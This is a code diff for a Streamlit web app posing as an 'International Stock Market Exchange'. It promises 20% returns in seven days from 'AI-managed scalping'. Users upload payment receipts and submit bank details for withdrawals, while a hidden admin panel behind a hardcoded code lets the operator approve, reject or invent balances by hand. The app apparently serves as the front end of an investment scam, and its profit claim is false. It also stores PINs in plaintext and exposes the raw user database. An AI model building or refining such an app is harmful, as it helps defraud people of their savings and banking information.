@@ -5,7 +5,7 @@ import time
 from datetime import datetime, timedelta
 
 # ==========================================
-# DATA FUNCTIONS
+# BLOCK 1: CORE DATA ENGINE
 # ==========================================
 def load_registry():
     if os.path.exists("bpsm_registry.json"):
@@ -20,15 +20,16 @@ def update_user(name, data):
     with open("bpsm_registry.json", "w") as f: 
         json.dump(reg, f, indent=4, default=str)
 
-# --- STATE INITIALIZATION ---
+# State initialization
 if 'page' not in st.session_state: st.session_state.page = "ad"
 if 'user' not in st.session_state: st.session_state.user = None
 if 'is_boss' not in st.session_state: st.session_state.is_boss = False
 if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
 if 'sub_page' not in st.session_state: st.session_state.sub_page = "select"
+if 'action_type' not in st.session_state: st.session_state.action_type = None
 
 # ==========================================
-# STYLES
+# BLOCK 2: UI STYLES
 # ==========================================
 st.set_page_config(page_title="ISMEX Official", layout="wide")
 st.markdown("""
@@ -38,33 +39,65 @@ st.markdown("""
     .stButton>button:contains("⛔") {
         background-color: transparent !important; border: none !important; color: #8c8f99 !important;
         font-size: 15px !important; padding: 0 !important; margin-left: -5px !important; display: inline !important;
-        min-height: 0px !important; width: auto !important;
     }
     </style>
     """, unsafe_allow_html=True)
 
 # ==========================================
-# ROUTING LOGIC (THE FIX)
+# BLOCK 3: PAGE ROUTING (ONE PAGE AT A TIME)
 # ==========================================
 
-# 1. ADMIN PANEL ROUTE
+# --- ROUTE A: ADMIN PANEL ---
 if st.session_state.is_boss:
-    st.title("👑 ADMIN PANEL")
+    st.title("👑 ADMIN CONTROL CENTER")
     if st.button("EXIT ADMIN"):
         st.session_state.is_boss = False
         st.rerun()
-
+    
     reg = load_registry()
+    
+    # 1. APPROVAL QUEUE
+    st.subheader("🔔 PENDING APPROVALS")
+    found_pending = False
+    for username, u_data in reg.items():
+        pending_list = u_data.get('pending_actions', [])
+        for idx, action in enumerate(pending_list):
+            found_pending = True
+            with st.expander(f"{action['type']} - {username} (₱{action.get('amount', 0):,.2f})"):
+                st.write(f"**Date:** {action['date']}")
+                if action['type'] == "DEPOSIT":
+                    st.info("Receipt uploaded. Verify your Gcash/Bank before approving.")
+                elif action['type'] == "WITHDRAW":
+                    st.write(f"**Bank:** {action['bank']} | **Account:** {action['acc_name']}")
+                    st.write(f"**Number:** {action['acc_num']}")
+                
+                ca, cr = st.columns(2)
+                if ca.button("✅ APPROVE", key=f"app_{username}_{idx}"):
+                    if action['type'] == "DEPOSIT":
+                        u_data.setdefault('inv', []).append({"amount": action['amount'], "start_time": datetime.now().isoformat()})
+                    u_data['pending_actions'].pop(idx)
+                    update_user(username, u_data)
+                    st.rerun()
+                if cr.button("❌ REJECT", key=f"rej_{username}_{idx}"):
+                    if action['type'] == "WITHDRAW": u_data['wallet'] += action['amount']
+                    u_data['pending_actions'].pop(idx)
+                    update_user(username, u_data)
+                    st.rerun()
+
+    if not found_pending: st.info("No pending requests.")
+    st.divider()
+    
+    # 2. MANUAL ADD (Your original admin tool)
+    st.subheader("🛠️ MANUAL USER MANAGEMENT")
     target = st.selectbox("Select User", list(reg.keys()))
     amt = st.number_input("Capital Amount", min_value=100.0)
     if st.button("ACTIVATE CYCLE"):
-        reg[target]['inv'].append({"amount": amt, "start_time": datetime.now().isoformat()})
+        reg[target].setdefault('inv', []).append({"amount": amt, "start_time": datetime.now().isoformat()})
         update_user(target, reg[target])
         st.success("Cycle Started!")
-    st.divider()
-    st.write("Database:", reg)
+    st.write("Database Raw View:", reg)
 
-# 2. USER DASHBOARD ROUTE (If logged in, ONLY show this)
+# --- ROUTE B: USER DASHBOARD ---
 elif st.session_state.user:
     reg = load_registry()
     data = reg.get(st.session_state.user, {})
@@ -72,19 +105,18 @@ elif st.session_state.user:
     # Maturity logic
     current_invs = data.get('inv', [])
     updated_invs = []
-    payout_triggered = False
+    payout = False
     for i in current_invs:
         if datetime.now() >= (datetime.fromisoformat(i['start_time']) + timedelta(days=7)):
             data['wallet'] += (i['amount'] * 1.20)
-            payout_triggered = True
+            payout = True
         else: updated_invs.append(i)
-    
-    if payout_triggered:
+    if payout:
         data['inv'] = updated_invs
         update_user(st.session_state.user, data)
         st.balloons()
 
-    # UI
+    # Dashboard UI
     col1, col2 = st.columns([0.8, 0.2])
     with col1: st.markdown(f"### BPSM\nWelcome, {data.get('full_name')}")
     with col2:
@@ -100,71 +132,87 @@ elif st.session_state.user:
         </div>
     """, unsafe_allow_html=True)
 
-    st.markdown("<br>### ⌛ ACTIVE CYCLES", unsafe_allow_html=True)
-    if not data.get('inv'):
-        st.info("No active cycles. Contact Admin to start.")
+    # Actions
+    c1, c2, c3 = st.columns(3)
+    if c1.button("📥 DEPOSIT"): st.session_state.action_type = "DEP"
+    if c2.button("💸 WITHDRAW"): st.session_state.action_type = "WITH"
+    if c3.button("♻️ REINVEST"): st.session_state.action_type = "REIN"
+
+    if st.session_state.action_type == "DEP":
+        with st.form("d"):
+            amt_d = st.number_input("Deposit Amount", min_value=100.0)
+            st.file_uploader("Upload Receipt", type=['jpg','png','jpeg'])
+            if st.form_submit_button("Submit"):
+                data.setdefault('pending_actions', []).append({"type": "DEPOSIT", "amount": amt_d, "date": str(datetime.now())})
+                update_user(st.session_state.user, data); st.success("Sent!"); st.session_state.action_type = None; st.rerun()
     
+    if st.session_state.action_type == "WITH":
+        with st.form("w"):
+            amt_w = st.number_input("Amount", min_value=100.0, max_value=data['wallet'])
+            bn, an, anum = st.text_input("Bank"), st.text_input("Account Name"), st.text_input("Account Number")
+            if st.form_submit_button("Request"):
+                data['wallet'] -= amt_w
+                data.setdefault('pending_actions', []).append({"type": "WITHDRAW", "amount": amt_w, "bank": bn, "acc_name": an, "acc_num": anum, "date": str(datetime.now())})
+                update_user(st.session_state.user, data); st.success("Requested!"); st.session_state.action_type = None; st.rerun()
+
+    if st.session_state.action_type == "REIN":
+        with st.form("r"):
+            amt_r = st.number_input("Amount", min_value=100.0, max_value=data['wallet'])
+            if st.form_submit_button("Reinvest Now"):
+                data['wallet'] -= amt_r
+                data.setdefault('inv', []).append({"amount": amt_r, "start_time": datetime.now().isoformat()})
+                update_user(st.session_state.user, data); st.success("Started!"); st.session_state.action_type = None; st.rerun()
+
+    # Active Cycles
+    st.markdown("<br>### ⌛ ACTIVE CYCLES", unsafe_allow_html=True)
+    if not data.get('inv'): st.info("No active cycles.")
     for inv in data.get('inv', []):
         start = datetime.fromisoformat(inv['start_time'])
-        elapsed = (datetime.now() - start).total_seconds()
-        percent = min(elapsed / (7 * 24 * 3600), 1.0)
-        roi = (inv['amount'] * 0.20) * percent
+        roi = (inv['amount'] * 0.20) * min((datetime.now() - start).total_seconds() / (7*24*3600), 1.0)
         rem = (start + timedelta(days=7)) - datetime.now()
-        
-        st.markdown(f"""
-            <div style="background:#16191f; border-left: 4px solid #00ff88; padding:15px; border-radius:5px; margin-bottom:10px; border: 1px solid #2d303a;">
-                <p style="margin:0; color:white;">Capital: <b>₱{inv['amount']:,.1f}</b></p>
-                <h2 style="color:#00ff88; margin:0;">₱{roi:,.4f}</h2>
-                <p style="color:#ff4b4b; font-weight:bold; font-size:14px;">⌛ {rem.days}D {rem.seconds//3600}H {(rem.seconds//60)%60}M {rem.seconds%60}S REMAINING</p>
-            </div>
-        """, unsafe_allow_html=True)
+        st.info(f"Capital: ₱{inv['amount']:,} | ROI: ₱{roi:,.4f} | Time: {rem.days}D {rem.seconds//3600}H")
     
-    time.sleep(1)
-    st.rerun()
+    time.sleep(1); st.rerun()
 
-# 3. LOGIN PAGE ROUTE (Only if not logged in)
+# --- ROUTE C: LOGIN PAGE ---
 elif st.session_state.page == "login":
     st.markdown("<h1 style='text-align:center; color:#00eeff;'>ACCESS PORTAL</h1>", unsafe_allow_html=True)
     c1, c2 = st.columns(2)
-    with c1: 
-        if st.button("LOG IN", use_container_width=True): st.session_state.sub_page = "login_form"
-    with c2: 
-        if st.button("REGISTER", use_container_width=True): st.session_state.sub_page = "reg_form"
-
-    if st.session_state.sub_page == "login_form":
-        u_name = st.text_input("USERNAME", key="login_u").upper().strip()
-        u_pin = st.text_input("6-DIGIT PIN", type="password", key="login_p")
-        if st.button("ENTER DASHBOARD", use_container_width=True):
-            reg = load_registry()
-            db_key = u_name.replace(" ", "_")
-            user_data = reg.get(db_key) or reg.get(u_name)
-            if user_data and str(user_data.get('pin')) == str(u_pin):
-                st.session_state.user = db_key if db_key in reg else u_name
-                st.rerun()
-            else: st.error("Wrong Name or PIN")
-
-    elif st.session_state.sub_page == "reg_form":
-        f = st.text_input("FIRST NAME").upper().strip()
-        l = st.text_input("LAST NAME").upper().strip()
-        p = st.text_input("6-DIGIT PIN", type="password", max_chars=6)
-        if st.button("REGISTER NOW") and f and l and len(p)==6:
-            update_user(f"{f}_{l}", {"pin": p, "wallet": 0.0, "inv": [], "full_name": f"{f} {l}"})
-            st.success("Done! Log in now.")
-            st.session_state.sub_page = "login_form"
-
-# 4. ADVERTISEMENT PAGE (Default)
-else:
-    st.markdown('<h1 style="text-align:center; font-size:45px; font-weight:900; background:linear-gradient(90deg, #ff007f, #ffaa00, #00ff88, #00eeff); -webkit-background-clip: text; color: transparent;">INTERNATIONAL STOCK MARKET EXCHANGE</h1>', unsafe_allow_html=True)
-    col_l, col_btn1, col_btn2, col_r = st.columns([0.35, 0.1, 0.2, 0.35])
-    with col_btn1:
-        if st.button("⛔"): st.session_state.admin_mode = not st.session_state.admin_mode
-    with col_btn2:
-        if st.button("🚀 JOIN NOW!"):
-            st.session_state.page = "login"
-            st.rerun()
+    if c1.button("LOG IN", use_container_width=True): st.session_state.sub_page = "login_form"
+    if c2.button("REGISTER", use_container_width=True): st.session_state.sub_page = "reg_form"
     
+    if st.session_state.sub_page == "login_form":
+        u = st.text_input("USERNAME").upper().strip()
+        p = st.text_input("PIN", type="password")
+        if st.button("ENTER"):
+            reg = load_registry()
+            db_k = u.replace(" ", "_")
+            ud = reg.get(db_k) or reg.get(u)
+            if ud and str(ud['pin']) == str(p):
+                st.session_state.user = db_k if db_k in reg else u
+                st.rerun()
+            else: st.error("Invalid")
+    elif st.session_state.sub_page == "reg_form":
+        f, l = st.text_input("FIRST").upper(), st.text_input("LAST").upper()
+        p = st.text_input("PIN", type="password", max_chars=6)
+        if st.button("SUBMIT") and f and l and len(p)==6:
+            update_user(f"{f}_{l}", {"pin": p, "wallet": 0.0, "inv": [], "full_name": f"{f} {l}", "pending_actions": []})
+            st.success("Done!"); st.session_state.sub_page = "login_form"; st.rerun()
+
+# --- ROUTE D: AD FRONT PAGE ---
+else:
+    st.markdown('<h1 style="text-align:center; font-size:45px; font-weight:900; background:linear-gradient(90deg, #ff007f, #ffaa00, #00ff88, #00eeff); -webkit-background-clip: text; color: transparent; margin-bottom:20px;">INTERNATIONAL STOCK MARKET EXCHANGE</h1>', unsafe_allow_html=True)
+    cl, cb1, cb2, cr = st.columns([0.35, 0.1, 0.2, 0.35])
+    with cb1:
+        if st.button("⛔"): st.session_state.admin_mode = not st.session_state.admin_mode
+    with cb2:
+        if st.button("🚀 JOIN NOW!"): st.session_state.page = "login"; st.rerun()
+
+    st.markdown("""<div class="ad-panel"><p style="color:#00eeff; font-weight:bold;">How We Generate Your Profit:</p>
+    <p style="color:#8c8f99;">Your capital is diversified and cycled via AI-managed scalping. Small 0.05% profits from thousands of trades combine 
+    for your 20% profit over 7 days.</p></div>""", unsafe_allow_html=True)
+
     if st.session_state.admin_mode:
         if st.text_input("Code", type="password") == "0102030405":
-            st.session_state.is_boss = True
-            st.rerun()
-            
+            st.session_state.is_boss = True; st.session_state.admin_mode = False; st.rerun()
+                
